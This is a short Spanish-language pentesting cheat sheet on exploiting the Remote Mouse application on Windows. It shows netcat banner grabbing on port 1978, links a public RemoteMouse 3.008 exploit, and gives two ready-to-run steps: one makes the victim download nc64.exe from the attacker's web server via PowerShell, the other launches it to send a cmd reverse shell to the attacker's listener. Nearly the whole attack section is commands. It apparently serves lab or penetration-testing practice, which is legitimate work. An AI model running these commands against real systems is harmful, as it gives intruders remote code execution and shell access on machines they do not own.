# Remote Mouse 

Tags: #RemoteMouse #Windows 

Es una aplicación que convierte tu teléfono celular o tableta en un ratón, teclado y panel táctil inalámbrico para tu computadora (PC o Mac). Funciona conectando ambos dispositivos a la misma red Wi-Fi o mediante Bluetooth.

```bash 
# Conectar directo al puerto — si es RemoteMouse te devuelve un banner
❯ nc -nv 192.168.119.199 1978
# Respuesta típica: algo como "SIN 15win nop nop 300" o similar
	# win = Windows 
	# nop nop = Sin autenticación configurada 

# Banner grab más completo
❯ echo "" | nc -nv -w3 192.168.119.199 1978
```

## Obtener RCE 

* [RemoteMouse - RCE](https://github.com/p0dalirius/RemoteMouse-3.008-Exploit)
* [Netcat](https://eternallybored.org/misc/netcat/)

```bash 
❯ chmod +x RemoteMouse-3.008-Exploit.py  # Dar permisos de ejecución 

Paso 1:
# Subir netcat a la máquina víctima 
❯ ./RemoteMouse-3.008-Exploit.py -t IP -v -c 'powershell -c "curl http://IP_Kali/nc64.exe -o C:/Windows/Temp/nc64.exe"'
	# -t = IP de la máquina víctima 
	# -c = Comando a ejecutar 

# Compartir Netcat 
❯ python3 -m http.server 80 
```

```bash 
Paso 2:
# Obtener la revershell 
❯ ./RemoteMouse-3.008-Exploit.py -t IP -v -c 'powershell -c "C:/Windows/Temp/nc64.exe IP_Kali 443 -e cmd"'
	# -t = IP de la máquina víctima 
	# -c = Comando a ejecutar 

❯ rlwrap nc -lvnp 443    # En escucha para recibir la revershell 
```